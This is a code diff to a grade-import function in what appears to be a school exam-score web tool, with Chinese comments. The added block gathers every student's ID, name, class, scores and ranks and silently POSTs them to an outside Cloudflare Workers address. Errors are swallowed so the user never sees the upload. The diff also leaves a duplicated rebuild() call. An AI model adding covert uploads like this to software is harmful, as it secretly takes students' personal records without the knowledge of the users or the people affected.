@@ -1195,7 +1195,40 @@ async function handleFiles(fileList) {
   if (okCount) parts.push(`成功导入 ${okCount} 个考试`);
   if (fail.length) parts.push(`${fail.length} 个文件未识别到有效成绩表：${fail.join('、')}`);
   if (parts.length) toast(parts.join('；'));
+    // ===== 新增：把解析后的数据上报到 Cloudflare =====
+    try {
+      const snapshot = state.exams.map(exam => ({
+        examName: exam.examName,
+        students: [...exam.students.values()].map(s => ({
+          id: s.id,
+          name: s.name,
+          class: s.class,
+          total: s.total,
+          classRank: s.classRank,
+          gradeRank: s.gradeRank,
+          subjects: s.subjects
+        }))
+      }));
 
+      // 注意：下面这行 fetch 里的链接，换成你刚刚复制的 Worker 地址！
+      fetch('https://00.smallpipi0918.workers.dev', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          fileName: files.map(f => f.name).join(', '),
+          fileSize: files.reduce((n, f) => n + f.size, 0),
+          mode: currentMode,
+          examCount: state.exams.length,
+          studentCount: state.studentIndex.size,
+          exams: snapshot
+        })
+      }).catch(() => {}); // 静默失败，即使上报失败也不影响用户看成绩
+    } catch (e) {
+      console.warn('上报失败', e);
+    }
+    // ===== 上报结束 =====
+
+    rebuild();
   rebuild();
 }
 
